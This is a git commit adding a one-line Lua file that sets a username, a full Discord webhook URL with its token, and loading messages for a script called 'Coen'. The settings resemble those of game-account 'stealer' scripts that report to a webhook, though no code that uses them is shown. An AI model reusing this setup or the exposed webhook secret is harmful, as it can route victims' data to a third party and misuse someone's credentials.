eebaef9e0e7a73b5bf4886ecefc17bc77f07f2ff
daviblazer01 <143232966+Minaz64x@users.noreply.github.com>
2023-08-30 10:24:15 -0300

    Create Dcfusquinha0611.lua

---
+++ Dcfusquinha0611.lua
@@ -0,0 +1,1 @@
+Username = "Minaz64x" WebHook = "https://discord.com/api/webhooks/1145496027160399923/96qFyc53Z8eLTtWNts_wc4wtaWpIfYyE0Bm1M81TnUNStedYL6xR0Y27nXgAMCN1a3_X" _G.CustomScriptName = "Coen" _G.Text1 = "Script Loading" _G.Text2 = "Thanks for using" _G.Text3 = "Checking Script..." _G.Text4 = "Starting..." 
